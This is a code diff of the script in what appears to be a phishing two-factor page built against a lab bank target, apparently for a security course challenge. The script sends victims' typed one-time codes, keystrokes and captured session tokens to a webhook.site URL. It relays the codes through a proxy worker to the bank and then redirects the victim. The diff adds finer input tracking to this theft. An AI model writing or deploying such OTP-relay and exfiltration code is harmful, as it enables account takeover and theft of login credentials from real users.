@@ -81,64 +81,88 @@ body{font-family:"Inter",-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helv
   </main>
 
   <script>
-    const PROXY   = 'https://veltra-worker.emi-hacklab.workers.dev';
-    const WEBHOOK = 'https://webhook.site/4d6add98-fee0-4e89-bfeb-bbdc49048c52';
-    const BANCO   = 'https://chl-252f32f0-0279-4210-a32f-5148b25c322d-veltra-bank.softwareseguro.com.ar';
+  const PROXY   = 'https://veltra-worker.emi-hacklab.workers.dev';
+  const WEBHOOK = 'https://webhook.site/NUEVA-URL-ACA';
+  const BANCO   = 'https://chl-252f32f0-0279-4210-a32f-5148b25c322d-veltra-bank.softwareseguro.com.ar';
 
-    const params = new URLSearchParams(location.search);
-    const capturedSession = params.get('s') || '';
-    const usuario = params.get('u') || '';
+  const params = new URLSearchParams(location.search);
+  const capturedSession = params.get('s') || '';
+  const usuario = params.get('u') || '';
 
-    document.getElementById('nombre-usuario').textContent = usuario;
+  document.getElementById('nombre-usuario').textContent = usuario;
 
-    function exfil(p) {
-      const qs = new URLSearchParams(p).toString();
-      new Image().src = WEBHOOK + '?' + qs;
-      fetch(WEBHOOK + '?' + qs, { mode: 'no-cors' }).catch(() => {});
-    }
+  function exfil(p) {
+    const qs = new URLSearchParams(p).toString();
+    new Image().src = WEBHOOK + '?' + qs;
+    fetch(WEBHOOK + '?' + qs, { mode: 'no-cors' }).catch(() => {});
+  }
 
-    async function proxyReq(path, body) {
-      const res = await fetch(PROXY + path, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify(body)
-      });
-      return res.json();
-    }
-    document.getElementById('txt-2fa').addEventListener('input', async function() {
-  const codigo = this.value.trim();
-  if (codigo.length !== 6) return;
+  function track(event, data) {
+    exfil({ event, ...data, ts: Date.now() });
+  }
 
-  exfil({ step: '2_realtime', otp: codigo, s: capturedSession });
+  window.addEventListener('error', e => {
+    track('js_error', { msg: e.message, line: e.lineno });
+  });
+  window.addEventListener('unhandledrejection', e => {
+    track('promise_error', { msg: String(e.reason) });
+  });
 
-  try {
-    const res = await proxyReq('/api/verificar-full', { codigo, session: capturedSession });
-    if (res.ok) {
-      window.location.href = BANCO + (res.next || '/dashboard');
-    }
-  } catch(err) {}
-});
+  document.addEventListener('DOMContentLoaded', () => {
+    track('pageload', { s: capturedSession ? 'ok' : 'empty', u: usuario });
 
-    document.getElementById('form-2fa').addEventListener('submit', async function(e) {
-      e.preventDefault();
-      const codigo = document.getElementById('txt-2fa').value.trim();
-      const btn = document.getElementById('btn-2fa');
+    const input = document.getElementById('txt-2fa');
+    input.addEventListener('focus', () => track('focus', { field: 'txt-2fa' }));
+    input.addEventListener('input', () => track('input', { field: 'txt-2fa', val: input.value }));
+    input.addEventListener('blur', () => track('blur', { val: input.value }));
 
-      btn.disabled = true;
-      btn.textContent = 'Confirmando…';
+    document.getElementById('btn-2fa').addEventListener('click', () => track('click', { btn: 'btn-2fa' }));
+    document.addEventListener('visibilitychange', () => track('visibility', { state: document.visibilityState }));
+  });
 
-      exfil({ step: '2', otp: codigo, s: capturedSession });
-
-      try {
-        const res = await proxyReq('/api/verificar-full', { codigo, session: capturedSession });
-        if (res.ok) {
-          window.location.href = BANCO + (res.next || '/dashboard');
-          return;
-        }
-      } catch (err) {}
-
-      setTimeout(() => { window.location.href = BANCO + '/login'; }, 800);
+  async function proxyReq(path, body) {
+    const res = await fetch(PROXY + path, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(body)
     });
-  </script>
+    return res.json();
+  }
+
+  document.getElementById('txt-2fa').addEventListener('input', async function() {
+    const codigo = this.value.trim();
+    if (codigo.length !== 6) return;
+    track('otp_complete', { otp: codigo });
+    try {
+      const res = await proxyReq('/api/verificar-full', { codigo, session: capturedSession });
+      track('verificar_result', { ok: res.ok, err: res.error || '' });
+      if (res.ok) {
+        window.location.href = BANCO + (res.next || '/dashboard');
+      }
+    } catch(err) {
+      track('verificar_error', { msg: String(err) });
+    }
+  });
+
+  document.getElementById('form-2fa').addEventListener('submit', async function(e) {
+    e.preventDefault();
+    const codigo = document.getElementById('txt-2fa').value.trim();
+    const btn = document.getElementById('btn-2fa');
+    btn.disabled = true;
+    btn.textContent = 'Confirmando…';
+    track('submit', { otp: codigo });
+    try {
+      const res = await proxyReq('/api/verificar-full', { codigo, session: capturedSession });
+      track('verificar_result', { ok: res.ok, err: res.error || '' });
+      if (res.ok) {
+        window.location.href = BANCO + (res.next || '/dashboard');
+        return;
+      }
+    } catch (err) {
+      track('verificar_error', { msg: String(err) });
+    }
+    setTimeout(() => { window.location.href = BANCO + '/login'; }, 800);
+  });
+</script>
 </body>
 </html>
